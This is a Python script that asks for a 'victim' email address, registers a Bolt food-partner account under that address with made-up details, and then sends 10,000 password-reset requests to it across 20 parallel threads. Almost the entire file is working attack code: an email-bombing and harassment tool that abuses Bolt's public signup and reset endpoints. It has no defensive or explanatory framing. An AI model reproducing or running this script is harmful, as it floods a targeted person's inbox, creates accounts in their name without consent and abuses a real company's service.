import requests
import re
import concurrent.futures

email = input("Enter The victim Email: ")

def GetToken():
    url = "https://node.bolt.eu/delivery-provider-leads/external/redirectToSignupFormWithData"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://bolt.eu/",
        "Content-Type": "application/json",
        "Origin": "https://bolt.eu",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=0",
        "Te": "trailers"
    }

    data = {
        "form_data": {
            "language": "en",
            "business_name": "admin",
            "business_type": "grocery_store",
            "cuisine": [],
            "address": "Lisbon",
            "lat": 38.722252,
            "lng": -9.139337,
            "country": "Portugal",
            "country_code": "PT",
            "city": "Lisbon",
            "place_id": "google|ChIJO_PkYRozGQ0R0DaQ5L3rAAQ",
            "email": email,
            "phone": "+351916385611"
        }
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        response.raise_for_status()
        response_json = response.json()

        # Extract the token using regex
        token = re.search(r'continue_token=([^&]+)', response_json['url']).group(1)
        return token

    except requests.RequestException as e:
        print(f"Error obtaining token: {e}")
        return None


def Register():
    token = GetToken()
    if not token:
        print("Failed to obtain token, exiting.")
        return

    url_2 = "https://node.bolt.eu/delivery-provider-portal/deliveryProviderPortal/public/sendSubmissionData"
    params = {
        "session_id": "2fa77e1d-15ca-4061-89ad-7bff66abe45c",
        "device_id": "2fa77e1d-15ca-4061-89ad-7bff66abe45c",
        "device_name": "Firefox",
        "device_os_version": "unknown",
        "language": "en-US",
        "version": "MW.0.01"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://foodpartner.bolt.eu/",
        "Content-Type": "application/json",
        "Origin": "https://foodpartner.bolt.eu",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=0",
        "Te": "trailers"
    }

    data = {
        "continue_token": token,
        "step_id": "AccountInformationStep",
        "is_final": True,
        "form_data": {
            "url_params": "",
            "language": "en",
            "first_name": "john",
            "last_name": "smith",
            "password": "Password999@",
            "commercial_terms_agreement": True,
            "legal_products_agreement": True,
            "legal_eu_dac7_agreement": True
        }
    }

    try:
        response = requests.post(url_2, headers=headers, params=params, json=data)
        response.raise_for_status()

        print(response.status_code)

        if response.text == """{"code":453682,"message":"SIGNUP_DUPLICATE_EMAIL"}""":
            print("The email already exists, starting spam...")
            spam(email)
        else:
            print("Account has been created, starting spam...")
            spam(email)

    except requests.RequestException as e:
        print(f"Error during registration: {e}")


def send_request(email):
    url_spam = "https://node.bolt.eu/delivery-provider/deliveryProviderPortal/public/requestResetPassword"
    params = {
        "session_id": "67bb6b09-8160-43d6-bcda-5129300d2ae6",
        "device_id": "67bb6b09-8160-43d6-bcda-5129300d2ae6",
        "device_name": "Firefox",
        "device_os_version": "unknown",
        "language": "en-US",
        "version": "MW.0.01"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://foodpartner.bolt.eu/",
        "Content-Type": "application/json",
        "Origin": "https://foodpartner.bolt.eu",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=0",
        "Te": "trailers"
    }

    data = {
        "username": email
    }

    try:
        response = requests.post(url_spam, headers=headers, params=params, json=data)
        response.raise_for_status()

        # Only print if the response is not 200
        if response.status_code == 200:
            print(response.status_code)
            print(response.status_code, response.text)

    except requests.RequestException as e:
        x=4
        # print(f"Error during spam request: {e}")


def spam(email):
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(send_request, email) for _ in range(10000)]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f"Generated an exception: {exc}")

Register()
